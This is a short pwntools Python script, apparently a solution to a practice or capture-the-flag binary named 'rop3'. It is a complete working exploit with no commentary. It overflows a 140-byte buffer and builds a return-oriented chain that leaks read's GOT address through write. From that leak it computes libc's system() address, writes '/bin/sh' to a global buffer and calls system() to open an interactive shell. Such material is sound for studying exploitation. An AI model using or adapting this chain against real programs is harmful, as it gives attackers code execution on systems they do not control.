from pwn import *
ov="A"*140

vulfun=0x08048474
sys_off=0x3b340
read_off=0xd9bf0
write_plt=0x080483A0
read_got=0x804A000
read_plt=0x08048360
globalbuf=0x0804A01F

rop1=ov+p32(write_plt)+p32(vulfun)\
+p32(1)+p32(read_got)+p32(4)

p=process("./rop3")
# gdb.attach(p,'''
# b *0x08048474
# b *0x0804849B
# ''')
context.log_level='debug'
p.sendline(rop1)
kk=p.recv()
read_addr=u32(kk)
system_addr=read_addr-read_off+sys_off
print "system address is ",hex(system_addr)

rop2=ov+p32(read_plt)+p32(vulfun)\
+p32(0)+p32(globalbuf)+p32(20)
p.sendline(rop2)

raw_input("sending /bin/sh")
p.sendline("/bin/sh\00")


rop3=ov+p32(system_addr)+p32(0)\
+p32(globalbuf)
p.sendline(rop3)
p.interactive()
